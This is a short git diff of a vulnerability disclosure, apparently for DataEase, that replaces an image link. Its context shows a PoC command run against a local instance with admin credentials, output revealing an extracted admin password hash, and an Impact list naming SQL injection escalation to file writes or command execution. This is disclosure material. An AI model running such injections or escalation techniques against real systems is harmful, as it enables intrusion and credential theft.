@@ -25,8 +25,9 @@ $ python3 PoC.py --url http://localhost:8100 --user admin --pass 'DataEase@12345
 [+] Value(s) returned by the injected expression:
     admin:504c8c8dfcbbe5b50d676ad65ef43909
 ```
+<img width="978" height="426" alt="image" src="https://github.com/user-attachments/assets/f6364380-df6d-414c-98f4-c6a71d276474" />
 
-![[Pasted image 20260908191551.png]]
+
 ## Impact
 - Read data from the database (users, password hashes, tokens).
 - Depending on the database service it might be possible to write files (e.g. MySQL `INTO OUTFILE`) or to execute commands (e.g. PostgreSQL `COPY ... PROGRAM`).
